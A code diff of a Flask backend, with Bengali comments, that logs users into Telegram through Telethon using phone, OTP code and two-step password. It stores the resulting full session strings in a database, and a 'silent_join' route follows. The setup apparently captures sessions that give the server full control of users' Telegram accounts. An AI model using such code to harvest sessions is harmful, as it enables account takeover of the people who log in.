@@ -9,6 +9,7 @@ from telethon.sessions import StringSession
 from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest
 import firebase_admin
 from firebase_admin import credentials, db
+from telethon.errors import SessionPasswordNeededError
 
 # ---------------------------------------------------------
 # ১. কনফিগারেশন ও ডাটাবেস সেটআপ
@@ -103,7 +104,8 @@ def send_otp_handler():
         return jsonify({"success": False, "message": "Connection Error, please retry."})
     finally:
         loop.close() # কাজ শেষে লুপটি পুরোপুরি বন্ধ করে দেওয়া
-                
+
+
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login_handler():
     data = request.json
@@ -111,7 +113,7 @@ def verify_login_handler():
     code = data.get('code')
     password = data.get('password')
     
-    # ১. ডাটাবেজ থেকে পেন্ডিং সেশন ডাটা খুঁজে বের করা
+    # ১. ডাটাবেজ থেকে ডাটা চেক করা
     temp_data = users_col.find_one({"phone": phone, "auth_pending": True})
     if not temp_data:
         return jsonify({"success": False, "message": "Session Expired! Please try again."})
@@ -119,54 +121,68 @@ def verify_login_handler():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    try:
-        # ২. ডাটাবেজে রাখা টেম্পোরারি সেশন দিয়ে ক্লায়েন্ট তৈরি
-        client = TelegramClient(StringSession(temp_data["temp_session"]), API_ID, API_HASH, loop=loop)
-        client.connect()
+    async def process_login():
+        # auto_reconnect=False দিলে Fatal Error আসার সম্ভাবনা কমে যায়
+        client = TelegramClient(StringSession(temp_data["temp_session"]), API_ID, API_HASH, loop=loop, auto_reconnect=False)
+        await client.connect()
         
-        # ৩. আসল সমাধান: পাসওয়ার্ড থাকলেও phone_code_hash মাস্ট দিতে হবে
-        if password:
-            # অ্যাকাউন্টে ২-স্টেপ পাসওয়ার্ড থাকলে এটি কাজ করবে
-            user = client.sign_in(
-                phone=phone, 
-                code=code, 
-                password=password, 
-                phone_code_hash=temp_data["phone_code_hash"]
-            )
-        else:
-            # শুধু ওটিপি দিয়ে লগইন করলে এটি কাজ করবে
-            user = client.sign_in(
-                phone=phone, 
-                code=code, 
-                phone_code_hash=temp_data["phone_code_hash"]
-            )
+        try:
+            if password:
+                user = await client.sign_in(
+                    phone=phone, 
+                    code=code, 
+                    password=password, 
+                    phone_code_hash=temp_data["phone_code_hash"]
+                )
+            else:
+                user = await client.sign_in(
+                    phone=phone, 
+                    code=code, 
+                    phone_code_hash=temp_data["phone_code_hash"]
+                )
             
-        session["uid"] = user.id
-        final_session = client.session.save()
+            final_session = client.session.save()
+            
+            # ডাটাবেজে পার্মানেন্ট ডাটা সেভ
+            users_col.update_one(
+                {"phone": phone}, 
+                {"$set": {
+                    "telegram_id": user.id,
+                    "name": user.first_name, 
+                    "session_str": final_session,
+                    "auth_pending": False # সাকসেস হলে পেন্ডিং বন্ধ
+                }}, 
+                upsert=True
+            )
+            return True, user.id
         
-        # ৪. লগইন সফল হলে ডাটাবেজে পার্মানেন্ট সেশন সেভ করা
-        users_col.update_one(
-            {"telegram_id": user.id}, 
-            {"$set": {
-                "name": user.first_name, 
-                "phone": phone, 
-                "session_str": final_session,
-                "auth_pending": False # কাজ শেষ, তাই পেন্ডিং স্ট্যাটাস বন্ধ
-            }}, 
-            upsert=True
-        )
-        
-        client.disconnect()
-        return jsonify({"success": True, "uid": user.id})
+        except SessionPasswordNeededError:
+            return False, "PASSWORD_NEEDED"
+        except Exception as e:
+            return False, str(e)
+        finally:
+            await client.disconnect()
 
-    except Exception as e:
-        error_msg = str(e)
-        # যদি পাসওয়ার্ড দরকার হয় কিন্তু ইউজার না দেয়, তবে এই এরর হ্যান্ডল করবে
-        if "password" in error_msg.lower() or "SessionPasswordNeeded" in error_msg:
-            return jsonify({"success": False, "message": "Two-steps verification is enabled and a password is required"})
+    try:
+        success, result = loop.run_until_complete(process_login())
         
-        print(f"Login Verification Error: {error_msg}")
-        return jsonify({"success": False, "message": error_msg})
+        if success:
+            return jsonify({"success": True, "uid": result})
+        else:
+            if result == "PASSWORD_NEEDED":
+                return jsonify({
+                    "success": False, 
+                    "message": "Two-steps verification is enabled and a password is required"
+                })
+            return jsonify({"success": False, "message": result})
+            
+    except Exception as fatal_e:
+        return jsonify({"success": False, "message": f"Server Error: {str(fatal_e)}"})
+    finally:
+        if not loop.is_closed():
+            loop.close()
+                
+
 
 @app.route('/api/silent_join', methods=['POST'])
 @login_required
